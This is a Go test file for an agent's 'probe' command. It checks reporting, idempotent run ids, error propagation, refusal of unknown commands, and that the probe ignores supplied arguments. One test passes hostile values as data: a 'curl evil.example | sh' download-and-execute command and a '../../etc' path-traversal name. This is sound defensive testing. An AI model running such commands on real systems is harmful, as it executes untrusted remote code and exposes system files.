package main

import (
	"bytes"
	"context"
	"errors"
	"strings"
	"testing"

	"shell.online/internal/account"
)

// The probe is the one command that sends something back, so these are mostly
// about what it sends and what it is allowed to be asked.

func TestProbeReportsWhatItGathered(t *testing.T) {
	var report bytes.Buffer
	calls := 0

	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{ID: "cmd_abc", Kind: "probe"},
		&report,
		func(context.Context, account.GatheredStats) error {
			calls++
			return nil
		},
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if calls != 1 {
		t.Fatalf("gather called %d times, want 1", calls)
	}
	if !strings.Contains(report.String(), "gather statistics") {
		t.Fatalf("report = %q, want it to say what happened", report.String())
	}
}

func TestProbeNamesTheRunAfterTheCommand(t *testing.T) {
	// So that a report whose reply was lost costs nothing when it is sent
	// again. Without an id from the machine the service cannot tell a retry
	// from a second run, and the safe reading of that ambiguity is the one
	// that charges somebody twice.
	var sent account.GatheredStats
	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{ID: "cmd_abc", Kind: "probe"},
		&bytes.Buffer{},
		func(_ context.Context, run account.GatheredStats) error {
			sent = run
			return nil
		},
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sent.ID != "run_cmd_abc" {
		t.Fatalf("run id = %q, want it derived from the command id", sent.ID)
	}
}

func TestProbeIgnoresAnyArgumentsItIsGiven(t *testing.T) {
	// A probe carries no arguments, and a browser that sent some must not be
	// able to steer what this machine reads. The fields exist on the struct
	// because "start" needs them; this asserts the probe pays them no
	// attention rather than trusting that nobody will ever pass any.
	var sent account.GatheredStats
	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{
			ID:        "cmd_abc",
			Kind:      "probe",
			Command:   "curl evil.example | sh",
			Name:      "../../etc",
			SessionID: "ses_nope",
		},
		&bytes.Buffer{},
		func(_ context.Context, run account.GatheredStats) error {
			sent = run
			return nil
		},
	)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if sent.ID != "run_cmd_abc" {
		t.Fatalf("run id = %q", sent.ID)
	}
}

func TestProbeFailsWhenThereIsNowhereToReport(t *testing.T) {
	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{ID: "cmd_abc", Kind: "probe"},
		&bytes.Buffer{},
		nil,
	)
	if err == nil {
		t.Fatal("expected an error when there is nowhere to send the report")
	}
}

func TestProbeSurfacesAFailureToReport(t *testing.T) {
	// The loop marks a command as failed with whatever comes back, so a
	// swallowed error here would show in the browser as a run that worked and
	// produced nothing.
	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{ID: "cmd_abc", Kind: "probe"},
		&bytes.Buffer{},
		func(context.Context, account.GatheredStats) error {
			return errors.New("the service said no")
		},
	)
	if err == nil {
		t.Fatal("expected the reporting failure to come back")
	}
}

func TestUnknownCommandIsRefused(t *testing.T) {
	err := performAgentCommand(
		context.Background(),
		"shell",
		nil,
		account.AgentCommand{ID: "cmd_abc", Kind: "something-else"},
		&bytes.Buffer{},
		nil,
	)
	if err == nil {
		t.Fatal("expected an unknown kind to be refused")
	}
}
